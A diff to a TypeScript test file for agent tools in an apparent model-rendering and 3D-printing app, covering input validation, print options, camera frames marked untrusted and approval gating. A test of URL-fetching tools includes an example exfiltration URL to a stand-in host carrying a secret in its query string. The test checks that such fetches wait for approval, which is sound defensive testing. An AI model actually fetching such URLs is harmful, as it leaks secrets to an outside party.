@@ -163,6 +163,46 @@ describe('settings tools pass every answer through redact (#322)', () => {
 })
 
 describe('render_model', () => {
+  it('renders template inputs and validates their params', async () => {
+    let body: unknown
+    server.use(
+      http.get(`${BACKEND}/api/v1/models/box/schema`, () => HttpResponse.json(SCHEMA)),
+      http.post(`${BACKEND}/api/v1/models/box/render`, async ({ request }) => {
+        body = await request.json()
+        return HttpResponse.json({ job_id: 'j', status_url: '' }, { status: 202 })
+      }),
+      http.get(`${BACKEND}/api/v1/jobs/j`, () => HttpResponse.json({ id: 'j', slug: 'box', created_at: '', status: 'done' })),
+    )
+    const inputs = { params: { width: 5 }, house: { storeys: 2 } }
+    await runTool(tool('render_model'), { slug: 'box', inputs }, ctx())
+    expect(body).toEqual({ inputs, version: null })
+    const refused = await runTool(tool('render_model'), { slug: 'box', inputs: { params: { width: 0 } } }, ctx())
+    expect(refused.isError).toBe(true)
+  })
+
+  it('refuses params beside inputs, and checks the inputs.params it renders', async () => {
+    let posts = 0
+    server.use(
+      http.get(`${BACKEND}/api/v1/models/box/schema`, () => HttpResponse.json(SCHEMA)),
+      http.post(`${BACKEND}/api/v1/models/box/render`, () => {
+        posts += 1
+        return HttpResponse.json({ job_id: 'j', status_url: '' }, { status: 202 })
+      }),
+      http.get(`${BACKEND}/api/v1/jobs/j`, () => HttpResponse.json({ id: 'j', slug: 'box', created_at: '', status: 'done' })),
+    )
+    const beside = await runTool(tool('render_model'), { slug: 'box', params: { width: 5 }, inputs: { house: {} } }, ctx())
+    expect(beside.isError).toBe(true)
+    expect(firstText(beside)).toBe('not rendered: put the parameters in inputs.params, not beside inputs')
+    const notObject = await runTool(tool('render_model'), { slug: 'box', inputs: { params: 'abc' } }, ctx())
+    expect(notObject.isError).toBe(true)
+    expect(firstText(notObject)).toBe('not rendered: inputs.params must be an object')
+    expect(posts).toBe(0)
+    // Without inputs.params the defaults render, and nothing else is checked.
+    const defaults = await runTool(tool('render_model'), { slug: 'box', inputs: { house: {} } }, ctx())
+    expect(defaults.isError).toBeFalsy()
+    expect(posts).toBe(1)
+  })
+
   it('refuses invalid parameters before queueing anything', async () => {
     server.use(http.get(`${BACKEND}/api/v1/models/box/schema`, () => HttpResponse.json(SCHEMA)))
     const result = await runTool(tool('render_model'), { slug: 'box', params: { width: 0 } }, ctx())
@@ -231,6 +271,23 @@ describe('render_model', () => {
       log_tail: ['cancelled: every request for it was withdrawn'],
     })
   })
+
+  it('saves the given inputs with the output, UI state and all', async () => {
+    let saved: unknown
+    server.use(
+      http.get(`${BACKEND}/api/v1/models/box/schema`, () => HttpResponse.json(SCHEMA)),
+      http.post(`${BACKEND}/api/v1/models/box/render`, () => HttpResponse.json({ job_id: 'j', status_url: '' }, { status: 202 })),
+      http.get(`${BACKEND}/api/v1/jobs/j`, () => HttpResponse.json({ id: 'j', slug: 'box', created_at: '', status: 'done' })),
+      http.post(`${BACKEND}/api/v1/models/box/outputs`, async ({ request }) => {
+        saved = await request.json()
+        return HttpResponse.json({ id: '0123456789abcdef0123456789abcdef' }, { status: 201 })
+      }),
+    )
+    const inputs = { params: { width: 40 }, v: 1, picked: 'x' }
+    const done = await runTool(tool('render_model'), { slug: 'box', inputs, save_output: true }, ctx())
+    expect(firstText(done)).toMatchObject({ status: 'done' })
+    expect(saved).toEqual({ job_id: 'j', name: null, inputs })
+  })
 })
 
 describe('uploads', () => {
@@ -249,6 +306,25 @@ describe('uploads', () => {
     expect(result.isError).toBeFalsy()
     expect(received?.type).toMatch(/^multipart\/form-data; boundary=/)
     expect(received).toMatchObject({ name: 'logo.svg', bytes: 41 })
+  })
+})
+
+describe('create_print_project (#930)', () => {
+  it('passes a parent project through, so an agent can nest one as the dialog does', async () => {
+    let body: unknown
+    server.use(
+      http.post(`${BACKEND}/api/v1/print/projects`, async ({ request }) => {
+        body = await request.json()
+        return HttpResponse.json({ id: 7, name: 'Tags', status: 'active', parent_id: 1 })
+      }),
+    )
+    const result = await tool('create_print_project').execute({ name: 'Tags', parent_id: 1 }, ctx())
+    expect(result.isError).toBeFalsy()
+    expect(body).toMatchObject({ name: 'Tags', parent_id: 1 })
+  })
+
+  it('says a parent applies only to a new project, not a linked one', () => {
+    expect(tool('create_print_project').description).toMatch(/parent_id.*only to a new project.*project_id.*refused/s)
   })
 })
 
@@ -319,6 +395,18 @@ describe('print_output (as it will run once approved, #258): spool-first, #335',
     })
     // Omitted, so the backend files it under the remembered project; null would be "No project".
     expect(run.body).not.toHaveProperty('project_id')
+  })
+
+  it('sends a chosen print_sequence, and omits it when none is chosen (#907)', async () => {
+    const chosen: { body?: unknown } = {}
+    const plain: { body?: unknown } = {}
+    const args = { output_id: OUT, printer_id: 2, filament_plan: { slots: [] }, nozzles: [{ size: '0.4' }], tier: 'standard', bed_type: 'Cool Plate' }
+    server.use(...capturedRun(chosen))
+    await tool('print_output').execute({ ...args, print_sequence: 'by object' }, ctx())
+    server.use(...capturedRun(plain))
+    await tool('print_output').execute(args, ctx())
+    expect(chosen.body).toMatchObject({ print_sequence: 'by object' })
+    expect(plain.body).not.toHaveProperty('print_sequence')
   })
 
   it('sends a new request_id per call, so the same choices again are a new print (#470)', async () => {
@@ -564,6 +652,22 @@ describe('print_output (as it will run once approved, #258): spool-first, #335',
   })
 })
 
+describe('get_printer_camera (#796)', () => {
+  it("returns the printer's current frame as an image, marked untrusted", async () => {
+    server.use(
+      http.get(`${BACKEND}/api/v1/print/printers/7/camera`, () =>
+        new HttpResponse(new Uint8Array([0xff, 0xd8, 0xff, 0xd9]), { headers: { 'content-type': 'image/jpeg' } }),
+      ),
+    )
+    const result = await runTool(tool('get_printer_camera'), { printer_id: 7 }, ctx())
+    expect(result.isError).toBeFalsy()
+    expect(JSON.parse((result.content[0] as { text: string }).text)).toMatchObject({
+      untrusted_data: { tool: 'get_printer_camera', content_follows: { type: 'image', mime_type: 'image/jpeg' } },
+    })
+    expect(result.content[1]).toMatchObject({ type: 'image', mimeType: 'image/jpeg' })
+  })
+})
+
 describe('analyze_geometry', () => {
   it('is a read tool returning the backend analysis', async () => {
     const id = 'a'.repeat(32)
@@ -609,6 +713,27 @@ describe('tools that make the backend fetch a URL (exfiltration, not SSRF)', () 
       status: 'pending_approval',
       summary: 'Fetch and import a model from https://evil.example/x?d=secret',
     })
+  })
+
+  it('fetch_asset is gated, and once approved posts the URL to the backend (#844)', async () => {
+    const url = 'https://openmoji.org/data/color/svg/1F984.svg'
+    const pending = await runTool(tool('fetch_asset'), { slug: 'box', url }, ctx())
+    expect(firstText(pending)).toMatchObject({
+      status: 'pending_approval',
+      summary: `Fetch ${url} (openmoji.org) into model "box" as a file asset`,
+    })
+    expect(tool('fetch_asset').risk).toBe('outward')
+
+    const bodies: unknown[] = []
+    server.use(
+      http.post(`${BACKEND}/api/v1/models/box/assets/fetch`, async ({ request }) => {
+        bodies.push(await request.json())
+        return HttpResponse.json({ id: 'a'.repeat(64), name: 'unicorn.svg', kind: 'svg', size: 10, source_url: url }, { status: 201 })
+      }),
+    )
+    const done = await runTool({ ...tool('fetch_asset'), gated: false }, { slug: 'box', url }, ctx())
+    expect(firstText(done)).toMatchObject({ id: 'a'.repeat(64), source_url: url })
+    expect(bodies).toEqual([{ url }])
   })
 
   it('pin_library runs unattended for a catalogue library, with or without its own URL', async () => {
